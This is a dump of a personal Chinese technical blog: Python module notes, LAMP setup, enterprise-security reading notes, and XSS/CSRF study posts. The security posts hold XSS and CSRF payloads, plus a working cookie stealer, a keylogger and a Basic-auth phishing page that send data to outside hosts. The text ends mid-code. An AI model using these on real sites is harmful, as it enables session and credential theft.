前面简单的总结了一下xss的常见的攻击，搭建了xss平台。也算一个了解了，但对于xss执行，并没有总结一下有哪些方式，恰逢假日，又看到一篇文章，遂，总结如下。 概念 反射型xss 存储型xss DOM型xss UXSS MXSS UXSS： 一种针对浏览器的xss，比起普通的xss，其危害在于，它危害的是浏览器本身，譬如根据浏览器本身功能的缺陷，或者根据浏览器拓展的功能缺陷，生成并执行代码 Unlike the common XSS attacks, UXSS is a type of attack that exploits client-side vulnerabilities in the browser or browser extensions in order to generate an XSS condition, and execute malicious code. MXSS 指的是一些本来看起来没有危害的html/js代码，经过浏览器渲染，形成了有危害的xss代码，其英文全称为：Mutation-based Cross-Site-Scripting 突变性xss html xss 顾名思义，就是在html里面构造的xss。 一般就是闭合尖括号，然后植入脚本 123456789101112&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!-- &#123;&#123; user input &#125;&#125; --&gt; &lt;div&gt;&lt;/div&gt;&lt;svg onload=alert(1)&gt;&lt;div&gt;&lt;/div&gt; &lt;div&gt;&lt;/div&gt;&lt;iframe onload=alert(1)&gt;&lt;div&gt;&lt;/div&gt; &lt;div&gt;&lt;/div&gt;&lt;script src=&apos;xx.js&apos;&gt;&lt;/script&gt;&lt;div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 属性 xss 在html标签里面的属性，存在用户输入，从而造成的xss，可分为三种，双引号，单引号，无引号 12345678910111213141516&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!-- &#123;&#123; user input &#125;&#125; --&gt; &lt;input value=&quot;&quot; autofocus onfocus=&quot;alert(1)&quot;&gt; &lt;input value=&apos;&apos; onmouseover=&quot;alert(1)&quot; &lt;input value=&apos;&apos; autofocus onblur=&quot;alert(1)&quot;&gt;&lt;/body&gt;&lt;/html&gt;onfocus 将焦点放在input里面onmouseover 鼠标移入事件onblur 鼠标移出事件 URL xss 这种xss 一般存在与a 标签里面 12345678&lt;script src=&quot;&#123;&#123;userinput&#125;&#125;&quot;&gt;&lt;/script&gt;&lt;a href=&quot;&#123;&#123;userinput&#125;&#125;&quot;&gt;Click&lt;/a&gt;&lt;iframe src=&quot;&#123;&#123;userinput&#125;&#125;&quot; /&gt;&lt;base href=&quot;&#123;&#123;userinput&#125;&#125;&quot;&gt;&lt;form action=&#123;&#123;userinput&#125;&#125;&gt;&lt;frameset&gt;&lt;frame src=&quot;&#123;&#123;userinput&#125;&#125;&quot;&gt;&lt;/frameset&gt;javascript:alert(/xss/) Javascript xss 根据不同的js代码，进行构造，一般闭合大括号，引号等等。 总结 XSS也算很老的漏洞的了，但总是有人可以把它玩出花来。 reference https://www.acunetix.com/blog/articles/universal-cross-site-scripting-uxss/ http://imweb.io/topic/55e3c132771670e207a16bcf https://www.anquanke.com/post/id/148357","categories":[{"name":"web_security","slug":"web-security","permalink":"http://yoursite.com/categories/web-security/"}],"tags":[{"name":"xss","slug":"xss","permalink":"http://yoursite.com/tags/xss/"}]},{"title":"python模块-shutil","slug":"python/python模块-shutil","date":"2018-06-21T13:52:26.000Z","updated":"2018-08-10T13:39:21.695Z","comments":true,"path":"2018/06/21/python/python模块-shutil/","link":"","permalink":"http://yoursite.com/2018/06/21/python/python模块-shutil/","excerpt":"","text":"概述 shutil模块提供了基于文件和文件夹的更高维度的操作，例如复制和移除等等 文件操作 shutil.copyfile(src,dst,follow_symlinks=True) 复制一个文件 12# dst也必须是一个文件名.shutil.copyfile(&apos;D://new_folder2/test2/testsample.txt&apos;,&quot;D://new_folder2//testsample.txt&quot;) shutil.copy(src,dst,follow_symlinks=True) 针对文件，复制操作 1shutil.copy(&apos;D://new_folder2//test2//testsample.txt&apos;,&quot;D://new_folder2//testsample2.txt&quot;) shutil.copy2(src,dst,follow_symlinks=True) 类似copy，不同的是，这个copy会同样复制文件的元数据。元数据指的是一个文件的权限，大小，创建时间等等。 shutil.copytree(src,dst) 1shutil.copytree(src, dst, symlinks=False, ignore=None,copy_function=copy2, ignore_dangling_symlinks=False) 复制文件夹,底下的文件，文件夹都会被复制。 1shutil.copytree(&apos;D://new_folder2//test2&apos;,&quot;D://new_folder2//test222&quot;,copy_function=shutil.copy2) shutil.rmtree(path) 移除文件夹及底下的文件 1shutil.rmtree(&quot;D://new_folder2//test222&quot;) shutil.move(src,dst,copy_function=copy2) 递归移动一个文件或者文件夹到dst，然后返回路径 123shutil.move(&apos;D://new_folder2/test3&apos;,&apos;D://new_folder2/test4&apos;)&gt;&gt;&gt;&gt;返回D://new_folder2/test4\\test2 shutil.disk_usage(path) 返回以bytes为单位的磁盘使用情况 12print(shutil.disk_usage(&apos;D://&apos;))&gt;&gt;&gt;&gt; usage(total=84001771520, used=76966387712, free=7035383808) shutil.chown(path,user=None,group=None) 改变一个文件/文件夹的所有者 1shutil.chown(path,user,group) shutil.which(cmd) 显示可执行程序所在的路径 1shutil.which(&apos;python&apos;) 归档压缩操作 shutil.make_archive(basename,format,root_dir,base_dir) 123456basename: 要创建的压缩文件名，需要包含路径format： zip,tar,gztar,bztar,zxtarroot_dir: 先进去这个root_dir的目录，然后在压缩base_dir的所有东西base_dir: 路径的前缀shutil.make_archive(&quot;D://new_folder2/test3&quot;,&apos;zip&apos;,&apos;D://new_folder2/&apos;,&apos;D://new_folder2/test3&apos;) shutil.unpack_archive(filename,extract_dir,format) 解压缩 12# test1 不存在，但是会自动创建shutil.unpack_archive(&apos;D://new_folder2/test3.zip&apos;,&quot;D://new_folder2//test1&quot;,&quot;zip&quot;)","categories":[{"name":"python模块","slug":"python模块","permalink":"http://yoursite.com/categories/python模块/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"配置phpstorm","slug":"linux/配置phpstorm","date":"2018-06-20T15:08:31.000Z","updated":"2018-08-12T10:08:25.756Z","comments":true,"path":"2018/06/20/linux/配置phpstorm/","link":"","permalink":"http://yoursite.com/2018/06/20/linux/配置phpstorm/","excerpt":"","text":"打开工具栏上面的Tools --&gt; Deployment --&gt; configuration 点击 Edit Configurations new 一个新的配置 写完代码，upload到localhost中。需要注意，当前用户需要对/var/www/html 这个文件夹有写入权限.然后点击运行。 参考 https://segmentfault.com/a/1190000003695273","categories":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"python模块-os","slug":"python/python模块-os","date":"2018-06-20T14:50:03.000Z","updated":"2018-08-10T13:39:06.482Z","comments":true,"path":"2018/06/20/python/python模块-os/","link":"","permalink":"http://yoursite.com/2018/06/20/python/python模块-os/","excerpt":"","text":"概述 这个模块提供了很多简单方便的方式去调用操作系统开放的功能，至于更高维度的文件，文件夹操作的方法需要参考 shutil 这个模块 在python中，文件名字，命令行参数，环境变量都是字符串。因此一些系统的字符转换就是必须的。可以使用 sys.getfilesystemencoding() 查看系统编码 系统 os.environ 返回环境变量 os.getenv(key) 得到key值的环境变量 os.uname() 相当于Linux的uname，得到系统的信息 12&gt;&gt;&gt; os.uname()(&apos;Linux&apos;, &apos;VM_16_8_centos&apos;, &apos;3.10.0-514.26.2.el7.x86_64&apos;, &apos;#1 SMP Tue Jul 4 15:04:05 UTC 2017&apos;, &apos;x86_64&apos;) os.getuid 123uid, os.getgidgid, os.getgroups() 返回当前进程相关的group os.getlogin() 得到当前登录的用户 os.popen(cmd,mode=‘r’,buffering=-1) 执行系统级别的命令，但是没有输出。 mode有 read和write两种模式。 但是常见的还是subprocess这个命令 1234import oswith os.popen(&apos;git clone https://github.com/zhuzhuyule/img_to_txt.git&apos;)as f: a = f.read()print(a) 文件夹操作 os.mkdir(path) 创建一个文件夹 os.rmdir(path) 移除文件夹 os.makedirs(path) 创建一系列文件夹 1os.makedirs(&apos;test/test/test&apos;) os.removedirs(path) 移除文件夹，包括子文件夹. 递归移除.如下，先移除最里面的test，然后是外层的test，最后在移除最外面的test 1os.removedirs(&apos;test/test/test&apos;) os.chdir(path) 变换路径 文件 os.listdir(path) 列出当前文件夹下面的所有文件和文件夹 os.scandir(path) 扫描当前路径下面的所有文件和文件夹，返回一个DirEntry对象。有以下属性 name path is_file is_dir inode is_symlink os.remove(path) path是文件的路径，注意，一定得是文件才能够删除。文件夹不能这样删 os.rename(src,dst) 在Unix 中，如果dst是个已经存在的文件，如果用户有权限，那么该文件会被没有提示的替换 在windows中，如果dst已经存在，那么就会出错，即使dst是个文件，而不是文件夹 rename具有移动文件夹（无论文件夹里面是否有文件），并且重命名的功能 123&gt;&gt;&gt; os.rename(&quot;d://New&quot;,&quot;d://new_folder&quot;) # 重命名&gt;&gt;&gt; os.rename(&quot;d://new_folder&quot;,&quot;new_folder2&quot;) # 将文件夹移动到当前目录并且改名&gt;&gt;&gt; os.renmae(&quot;new_folder2&quot;,&quot;d://new_folder&quot;) # 文件夹里面还有文件，也可以移动+改名 os.renames(old,new) 将old层级文件夹全部改名为new的层级文件夹 12345&gt;&gt;&gt; os.renames(&quot;d://new_folder2//test2//test2.txt&quot;,&quot;d://new_folder2//test1//test1.txt&quot;)此时 test2 文件夹会变成test1文件夹， test2.txt 会变成test1.txt而与rename不同的是： rename如果test2文件夹不存在，就会出错。（但是如果文件夹存在就不会出错） rename是不会出错的。不管文件夹存不存在。但是如果文件夹之前存在，他就会被改名消失。除非这个文件夹里面还有其他东西，这样这个文件夹就不会被改名消失。 os.walk(path) 返回一个generator对象，分别有三个值： root, dirs, files, 12345678910111213141516171819202122root ： 返回当前路径下所有文件夹的路径，字符串dirs： 返回一个list，返回当前路径下的文件夹名称，如果子文件夹还有文件夹，返回另外一个listfiles： 返回list，类似dirs，只不过返回的是文件名。&gt;&gt;&gt; for root,dirs,files in os.walk(&quot;d://new_folder2//&quot;): print(&quot;files: &quot;,files) print(&quot;root: &quot;,root) print(&quot;dirs: &quot;,dirs) files: [&apos;test.txt&apos;]root: d://new_folder2//dirs: [&apos;test1&apos;, &apos;test2&apos;]files: [&apos;test1.txt&apos;]root: d://new_folder2//test1dirs: []files: [&apos;test2.txt&apos;, &apos;testsample.txt&apos;]root: d://new_folder2//test2dirs: [&apos;teste233&apos;]files: []root: d://new_folder2//test2\\teste233dirs: [] os.replace() 这个是跨平台的os.rename 1234567891011# test1 是存在的文件夹#os.replace(&apos;D://new_folder2//test2/test2.txt&apos;,&quot;D://new_folder2//test1//test21.txt&quot;)# test5 是不存在的文件夹， 失败#os.replace(&apos;D://new_folder2//test4/test1.txt&apos;,&quot;D://new_folder2//test5//test51.txt&quot;)#成功#os.replace(&apos;D://new_folder2//test1&apos;,&quot;D://new_folder2//test4&quot;)# 成功# os.renames(&apos;D://new_folder2//test1/test21.txt&apos;,&quot;D://new_folder2//test3//test21.txt&quot;)","categories":[{"name":"python模块","slug":"python模块","permalink":"http://yoursite.com/categories/python模块/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"在ubuntu18下配置php开发环境","slug":"linux/在ubuntu18下配置php开发环境","date":"2018-06-20T11:30:22.000Z","updated":"2018-08-12T10:08:22.569Z","comments":true,"path":"2018/06/20/linux/在ubuntu18下配置php开发环境/","link":"","permalink":"http://yoursite.com/2018/06/20/linux/在ubuntu18下配置php开发环境/","excerpt":"","text":"更新源 1234567891011121314sudo gedit /etc/apt/source.listdeb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversesudo apt-get update -y 安装apache 123sudo apt install apache2service apache2 statusservice apache2 restrat 安装php7 12sudo apt install php7.0php -v 安装mysql5.7 12345678910111213141516171819202122232425sudo apt install mysql-server # 更改密码sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf---加上...skip-grant-tables ...-----sudo service mysql restart mysql -u rootuse msyql;UPDATE user set plugin=&apos;mysql_native_password&apos; where user=&apos;root&apos;;update user set authentication_string = password(&apos;qwe123&apos;), password_expired = &apos;N&apos;, password_last_changed = now() where user = &apos;root&apos;;flush privileges;select user, host, plugin from user where user=&apos;root&apos;;# 改回来配置+重启mysql -u root -p qwe123 安装php-admin 12345sudo apt-get install phpmyadmin php-mbstring php-gettext，安装的过程中选择apache2。sudo phpenmod mcryptsudo phpenmod mbstring修改完成之后sudo systemctl restart apache2重启apache2服务器。 测试 123打开浏览器http://localhost/phpmyadmin Reference https://segmentfault.com/a/1190000005786808 https://stackoverflow.com/questions/39281594/error-1698-28000-access-denied-for-user-rootlocalhost","categories":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"4-DDoS了解","slug":"企业安全建设读书笔记/4-DDoS了解","date":"2018-06-18T12:19:53.000Z","updated":"2018-08-12T10:12:36.326Z","comments":true,"path":"2018/06/18/企业安全建设读书笔记/4-DDoS了解/","link":"","permalink":"http://yoursite.com/2018/06/18/企业安全建设读书笔记/4-DDoS了解/","excerpt":"","text":"概述 DDoS攻击分为流量型攻击和CC攻击，流量攻击主要是发送报文侵占正常业务的带宽，阻塞整个数据中心的出口，导致正常用户的访问无法到达。 CC攻击 主要针对某些业务频繁访问，激发大量消耗资源的数据库查询，文件IO，导致业务服务器CPU，或者IO出现瓶颈，无法提供正常的服务。 案例 TCP SYN FLOOD 一个正常的TCP需要三次握手，如下所示： 123客户端 --发送TCP SYN数据包--&gt;服务器分配控制块--返回SYN ACK数据包--&gt; 客户端 --返回 SYN ACK数据包--&gt; 服务器端--&gt; 服务器释放控制块如果客户端不返回SYN ACK数据包，或者不存在，那么就会造成TCP SYN 泛洪攻击 UDP FLOOD攻击 UDP 是没有连接状态的协议，因此可以发送大量的UDP请求，干扰正常应用。 反射型攻击 黑客伪造IP，向网络上大量开放特定服务的服务器进行请求，从而造成被伪造IP地址的服务器形成了DDoS攻击 解决方案 1, 流量清洗 2，流量压制","categories":[{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/categories/企业安全建设/"}],"tags":[{"name":"读书笔记1","slug":"读书笔记1","permalink":"http://yoursite.com/tags/读书笔记1/"}]},{"title":"5-RASP安装","slug":"企业安全建设读书笔记/5-RASP安装","date":"2018-06-18T12:19:39.000Z","updated":"2018-08-12T10:12:39.192Z","comments":true,"path":"2018/06/18/企业安全建设读书笔记/5-RASP安装/","link":"","permalink":"http://yoursite.com/2018/06/18/企业安全建设读书笔记/5-RASP安装/","excerpt":"","text":"概述 RASP, 一种已探针的形式，将保护引擎注入到应用服务中，可在文件，数据库，网络等多个方面，对应用进行保护，当发生敏感的行为时，可以结合上下文的请求进行判断，阻断攻击，具有低误报率，低漏报率的优点 安装 这里使用的是百度开源的OpenRASP进行实验。下面是实验步骤 安装tomcat服务器 123456789101112131415161718192021222324yum install java -y下载tomcathttps://tomcat.apache.org/download-80.cgi配置manager页面vim conf/tomcat-users.xml&lt;role rolename=&quot;admin&quot;/&gt;&lt;role rolename=&quot;admin-gui&quot;/&gt;&lt;role rolename=&quot;admin-script&quot;/&gt;&lt;role rolename=&quot;manager-gui&quot;/&gt;&lt;role rolename=&quot;manager-script&quot;/&gt;&lt;role rolename=&quot;manager-jmx&quot;/&gt;&lt;role rolename=&quot;manager-status&quot;/&gt;&lt;user username=&quot;admin&quot; password=&quot;admin&quot; roles=&quot;admin,admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status&quot;/&gt;添加远程访问vim conf/Catalina/localhost/manager.xml:&lt;Context privileged=&quot;true&quot; antiResourceLocking=&quot;false&quot; docBase=&quot;$&#123;catalina.home&#125;/webapps/manager&quot;&gt; &lt;Valve className=&quot;org.apache.catalina.valves.RemoteAddrValve&quot; allow=&quot;^.*$&quot; /&gt;&lt;/Context&gt; 下载漏洞程序 123456789https://sourceforge.net/projects/wavsep/进入tomcat的manager.html页面进行deploy(因为需要数据库，这里需要安装mysql。)然后打开http://192.168.31.39:8080/wavsep/wavsep-install/install.jsp 安装结束 安装openRASP 1java -jar RaspInstall.jar -install &lt;tomcat_root&gt; restart tomcat 总结 进行了漏洞测试，发现规则支持还不够强大，需要自己写一些规则，定制性高。","categories":[{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/categories/企业安全建设/"}],"tags":[{"name":"读书笔记1","slug":"读书笔记1","permalink":"http://yoursite.com/tags/读书笔记1/"}]},{"title":"3-搭建WAF环境","slug":"企业安全建设读书笔记/3-搭建WAF环境","date":"2018-06-18T12:19:26.000Z","updated":"2018-08-12T10:12:32.682Z","comments":true,"path":"2018/06/18/企业安全建设读书笔记/3-搭建WAF环境/","link":"","permalink":"http://yoursite.com/2018/06/18/企业安全建设读书笔记/3-搭建WAF环境/","excerpt":"","text":"概述 针对HTTP/HTTPS的安全策略为web应用提供保护的产品，承担了sql注入，xss，远程命令执行，目录遍历等攻击的抵抗，是守护安全的第一道防线 优点 使用，配置简单方便 能够抵抗常见的扫描和常见的漏洞测探 缺点 防护能力不足以对抗黑产，依赖规则，针对未知攻击无应对方法，容易绕过 无法承担基础业务安全能力，比如褥羊毛行为，刷短信接口等 审计能力不足，出现事故无法提取较为详细的事件log记录等等 配置一个简单的WAF 以unixhot的WAF为例，进行分析，其代码的架构如下 其中access.lua有一堆的check函数，分别来自init.lua文件。 12345init.lua文件分别从config.lua和lib.lua文件中取得:规则开关+解析用户请求数据+自己定义的正则规则 =决定该请求是否为合法请求 OpenResty 基于nginx与lua的高性能web平台，内部集成了大量精良的nginx模块，用于方便的搭建超高并发和拓展性极高的web应用，web服务和动态网管 123456789101112131415161718192021222324252627282930# 安装Debian 和 Ubuntu 用户推荐您使用 apt-get安装以下的开发库:apt-get install libpcre3-dev \\ libssl-dev perl make build-essential curlFedora 和 RedHat 用户推荐您使用yum安装以下的开发库:yum install pcre-devel openssl-devel gcc curl./configure然后在进入 openresty-VERSION/ 目录, 然后输入以下命令配置:./configure默认, --prefix=/usr/local/openresty 程序会被安装到/usr/local/openresty目录。您可以指定各种选项，比如./configure --prefix=/opt/openresty \\ --with-luajit \\ --without-http_redis2_module \\ --with-http_iconv_module \\ --with-http_postgres_module make或者make -j2 （双核编译）sudo make install waf https://github.com/unixhot/waf.git 配置反向代理 12345678910111213141516171819202122232425262728# openrestyhttp&#123; ... lua_shared_dict limit 50m; lua_package_path &quot;/usr/local/openresty/nginx/conf/waf/?.lua&quot;; init_by_lua_file &quot;/usr/local/openresty/nginx/conf/waf/init.lua&quot;; access_by_lua_file &quot;/usr/local/openresty/nginx/conf/waf/access.lua&quot;;&#125;include &quot;/usr/local/openresty/nginx/conf/www.testwaf.com.conf&quot;;./nginx -s reload# www.testwaf.com.confupstream testwaf&#123; server 192.168.1.12:80;&#125;server &#123; listen 80; server_name www.testwaf.com; location / &#123; proxy_pass: http://testwaf; index index.html index.htm; &#125;&#125;# 最好使用root权限安装 一切安装好以后，效果如下： Reference https://openresty.org/cn/ https://openresty.org/cn/installation.html","categories":[{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/categories/企业安全建设/"}],"tags":[{"name":"读书笔记1","slug":"读书笔记1","permalink":"http://yoursite.com/tags/读书笔记1/"}]},{"title":"2-常见防御体系","slug":"企业安全建设读书笔记/2-常见防御体系","date":"2018-06-18T12:19:01.000Z","updated":"2018-08-12T10:12:27.060Z","comments":true,"path":"2018/06/18/企业安全建设读书笔记/2-常见防御体系/","link":"","permalink":"http://yoursite.com/2018/06/18/企业安全建设读书笔记/2-常见防御体系/","excerpt":"","text":"名词解释 IDS： IDS是英文“Intrusion Detection Systems”的缩写，中文意思是“入侵检测系统”。 专业上讲就是依照一定的安全策略，通过软、硬件，对网络、系统的运行状况进行监视， 尽可能发现各种攻击企图、攻击行为或者攻击结果，以保证网络系统资源的机密性、完整性和可用性。 做一个形象的比喻： 假如防火墙是一幢大楼的门锁，那么IDS就是这幢大楼里的监视系统。一旦小偷爬窗进入大楼，或内部人员有越界行为，只有实时监视系统才能发现情况并发出警告。 IPS 入侵防御系统(IPS: Intrusion Prevention System)是电脑网络安全设施，是对防病毒软件（Antivirus Programs）和防火墙(Packet Filter, Application Gateway)的补充。 入侵防御系统(Intrusion-prevention system)是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。 UTM UTM是对传统防护手段的整合和升华，是建立在原有安全网关设备基础之上的，拥有防火墙、入侵防御(IPS)、防病毒(AV)、VPN、内容过滤、反垃圾邮件等多种功能，这些技术处理方式仍然是UTM的基础，但这些处理方式不再各自为战，需要在统一的安全策略下相互配合，协同工作。 对于众多的功能，有必备功能和增值功能之分。一般而言，防火墙、VPN、入侵防御、防病毒是必备的功能模块，缺少任何一个不能称之为UTM。其余是增值功能，用户可以根据自身需求进行选择。 web威胁感知 识别Web应用攻击，能够深度挖掘黑客针对Web的拖库、远程命令执行、敏感文件泄露、Webshell后门等攻击事件并发出准确的报警 常见的防御体系 边界防护 123456789101112&quot;在网络边界解决问题，强调御敌于国门之外&quot;主要措施：a. WAFb. 内外网隔离优点：部署简单缺点：内网突破后，黑客就控制了一切。 纵深防御体系 12345678910111213&quot;纵深防御本质为多层防御，增加攻击成本。&quot;纵深防御分为四部分：a. 网络边界：WAF，防火墙，IPS，UTM，流量清洗设备等等b. 网络层：IDS，web威胁感知，web审计c. 服务器端：主机IDS，服务器杀毒，内核假哭，主机WAF等d. 数据库：数据库审计，数据库防火墙等优点：防护的定位清晰，攻击成本提高，安全性提高缺点：各个部分缺乏协同性，检测手段多基于黑名单和规则，对于专业的黑客而言，也是可以突破的。 河防体系 在隔离的基础上，严格控制办公网络对生产网络的访问，同时在生产网络的内部进行隔离的基础上，进行边界防护和检测。适用于数据中心用户 塔防体系 纵深防御的一种，加上了云的管控能力和威胁情报数据。 参考 https://anquan.baidu.com/pages/threat.html https://searchsecurity.techtarget.com.cn/11-17666/ https://baike.baidu.com/item/IPS/2131631 https://zh.wikipedia.org/wiki/入侵检测系统 https://baike.baidu.com/item/IDS/22042","categories":[{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/categories/企业安全建设/"}],"tags":[{"name":"读书笔记1","slug":"读书笔记1","permalink":"http://yoursite.com/tags/读书笔记1/"}]},{"title":"1-企业安全建设入门","slug":"企业安全建设读书笔记/1-企业安全建设入门","date":"2018-06-18T12:18:46.000Z","updated":"2018-08-12T10:12:22.428Z","comments":true,"path":"2018/06/18/企业安全建设读书笔记/1-企业安全建设入门/","link":"","permalink":"http://yoursite.com/2018/06/18/企业安全建设读书笔记/1-企业安全建设入门/","excerpt":"","text":"两个概念 PDR： 12345678protection（保护）：加密，认证，访问控制，防火墙，杀毒软件等等detection（检测）：入侵检测，漏洞扫描等response（应急响应）：建立应急响应机制，形成对安全的及时响应能力等 P2DR 12345678910protectionDetectionResponsePolice建立在PDR的基础上，多了一个Police（根据风险分析产生的安全策略），其中Police是模型的核心。着重于描述：系统中哪些资源需要保护？如何实现对它们的保护？","categories":[{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/categories/企业安全建设/"}],"tags":[{"name":"读书笔记1","slug":"读书笔记1","permalink":"http://yoursite.com/tags/读书笔记1/"}]},{"title":"CSRF攻击学习","slug":"web_security/CSRF攻击学习","date":"2018-06-14T15:26:27.000Z","updated":"2018-08-12T10:11:33.938Z","comments":true,"path":"2018/06/14/web_security/CSRF攻击学习/","link":"","permalink":"http://yoursite.com/2018/06/14/web_security/CSRF攻击学习/","excerpt":"","text":"概述 一图胜千言 攻击方式 GET方式 假如现在有一个链接： https://csrf.com/m?addUser=id12345 那么我们就可以构造一个图片 1&lt;img src=&apos;https://csrf.com/m?addUser=id12345&apos;&gt; 只要你访问我的网站，那么就会触发这个链接，从而关注了我 POST方式 POST的请求经常伴随着跳转，一跳转，就会暴露，这个时候我们就要考虑加一个iframe。 但是在csrf测试的页面加iframe，根据同源政策，显示不来内容。于是我们新建另一个页面，加上iframe，连接到csrf的测试页面。如下： 新建一个iframe 123456&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;iframe style=&quot;display:block&quot; src=&apos;test.html&apos;&gt;&lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; 在建一个test.html 123456789101112131415&lt;!DOCTYPE HTML&gt;&lt;html lang=\"en-US\"&gt;&lt;head&gt;&lt;title&gt;CSRF GET&lt;/title&gt;&lt;body&gt; &lt;form name=\"form1\" action=\"http://127.0.0.1:5000/csrf\" method=\"post\"&gt; &lt;input type='hidden' name='username' value=\"csrf_ee1\"&gt; &lt;input type=\"hidden\" name=\"password\" value=\"qwe1231\"/&gt; &lt;input type=\"submit\" value&gt; &lt;/form&gt; &lt;script&gt; document.forms.form1.submit(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 这样一来，成功复现了csrf 什么叫做XSRF？ XSRF指的是xss+csrf的攻击，指的是一个网站既有xss又有csrf。 这样一来就可以进行两者的结合，通过xss注入csrf的html代码。 通过js生成代码 123456&lt;script&gt; var iframe = document.createElement('iframe'); iframe.style.display = 'none'; iframe.src='test.html'; document.body.appendChild(iframe);&lt;/script&gt; 总结 csrf总的来说，主要聚焦于写，并不会窃取用户的数据。","categories":[{"name":"web_security","slug":"web-security","permalink":"http://yoursite.com/categories/web-security/"}],"tags":[{"name":"csrf","slug":"csrf","permalink":"http://yoursite.com/tags/csrf/"}]},{"title":"xss攻击学习","slug":"web_security/xss攻击学习","date":"2018-06-14T15:12:45.000Z","updated":"2018-08-12T10:11:22.771Z","comments":true,"path":"2018/06/14/web_security/xss攻击学习/","link":"","permalink":"http://yoursite.com/2018/06/14/web_security/xss攻击学习/","excerpt":"","text":"概念 xss 全称为 cross site scripting. 特指攻击者利用网站对于用户输入过滤不足的缺陷，输入可以对用户造成影响的html/js代码，从而窃取用户信息，进行病毒侵害等行为。 类型 反射型 将用户输入的数据通过url的形式直接或未经完善过滤就在浏览器中输出，导致浏览器执行了用户输入的代码数据 存储型 程序将用户输入的数据信息保存在了服务器端（如数据库），网页在查询数据时候，从中获取了畸形数据内容，在网页进行展示。造成xss DOM型 反射型xss的一种，不同点在于，注入的方式是根据js的DOM进行分析并注入,较为少见。 攻击 盗取cookies 简单的： 12345678910#jsDocument.location=&apos;https://www.xsser.me/cookies.php?cookie=&apos;+document.cookie;#php&lt;?php$cookie = $_GET[&apos;cookie&apos;];$log = fopen(&quot;cookies.txt&quot;,&quot;a&quot;);Fwrite($log,$cookie.&quot;&quot;\\n&quot;)Fclose($log)?&gt; 复杂的： 12345678910111213141516171819202122232425262728293031(function() &#123; (new Image()).src = &apos;http://xsser.me/index.php?do=api&amp;id=RAMWD1&amp;location=&apos; + escape((function() &#123; try &#123; return document.location.href &#125; catch (e) &#123; return &apos;&apos; &#125; &#125;)()) + &apos;&amp;toplocation=&apos; + escape((function() &#123; try &#123; return top.location.href &#125; catch (e) &#123; return &apos;&apos; &#125; &#125;)()) + &apos;&amp;cookie=&apos; + escape((function() &#123; try &#123; return document.cookie &#125; catch (e) &#123; return &apos;&apos; &#125; &#125;)()) + &apos;&amp;opener=&apos; + escape((function() &#123; try &#123; return (window.opener &amp;&amp; window.opener.location.href) ? window.opener.location.href : &apos;&apos; &#125; catch (e) &#123; return &apos;&apos; &#125; &#125;)());&#125;)();if (&apos;&apos; == 1) &#123; keep = new Image(); keep.src = &apos;http://xsser.me/index.php?do=keepsession&amp;id=RAMWD1&amp;url=&apos; + escape(document.location) + &apos;&amp;cookie=&apos; + escape(document.cookie)&#125;; 读取用户键盘输入 123456789101112131415161718192021222324252627#!js$(document).ready(function()&#123; var server = &quot;http://server.com/&quot;; //接收服务器 var gate = &quot;data.php?data=&quot;; //接收文件 var tabURL = window.location.href; var keys=&apos;&apos;; document.onkeypress = function(e) &#123; get = window.event?event:e; key = get.keyCode?get.keyCode:get.charCode; key = String.fromCharCode(key); keys+=key; &#125; window.setInterval(function()&#123; new Image().src = server+gate+keys; keys = &apos;&apos;; &#125;, 1000); &#125;);#!php&lt;?php$txt = $_GET[&apos;data&apos;];$log = fopen(&quot;keylog.txt&quot;, &quot;a&quot;) or die(&quot;Unable to open file!&quot;);fwrite($log, $txt);fclose($log);?&gt; 网络钓鱼攻击 123456789101112131415161718192021222324252627282930# html&lt;html&gt; &lt;body&gt; &lt;script src=&quot;http://192.168.31.63/authtest.php?id=RAMWD1&amp;info=age%2Cmonth&quot;&gt; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;#php&lt;?error_reporting(0);if ((!isset($_SERVER[&apos;PHP_AUTH_USER&apos;])) || (!isset($_SERVER[&apos;PHP_AUTH_PW&apos;]))) &#123; header(&apos;WWW-Authenticate: Basic realm=&quot;&apos;.addslashes(trim($_GET[&apos;info&apos;])).&apos;&quot;&apos;); header(&apos;HTTP/1.0 401 Unauthorized&apos;); echo &apos;Authorization Required.&apos;; exit;&#125; else if 